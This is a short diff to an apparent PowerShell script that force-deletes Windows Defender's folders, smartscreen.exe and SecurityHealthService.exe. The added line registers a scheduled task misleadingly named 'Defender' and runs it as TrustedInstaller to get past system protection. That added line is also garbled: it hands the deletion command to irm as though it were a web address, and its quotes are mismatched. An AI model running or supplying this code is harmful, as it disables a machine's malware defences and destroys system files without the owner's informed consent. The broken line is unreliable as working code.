@@ -1,1 +1,2 @@
 rm -r -fo "C:\Program Files*\Windows Defender*";rm -fo C:\Windows\System32\smartscreen.exe,C:\Windows\System32\SecurityHealthService.exe
+Register-ScheduledTask -TaskName 'Defender' -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"irm 'rm -r -fo "C:\Program Files*\Windows Defender*";rm -fo C:\Windows\System32\smartscreen.exe,C:\Windows\System32\SecurityHealthService.exe`"") -Force; $svc=New-Object -ComObject 'Schedule.Service'; $svc.Connect(); $svc.GetFolder('\').GetTask('Defender').RunEx($null,0,0,'NT SERVICE\TrustedInstaller')
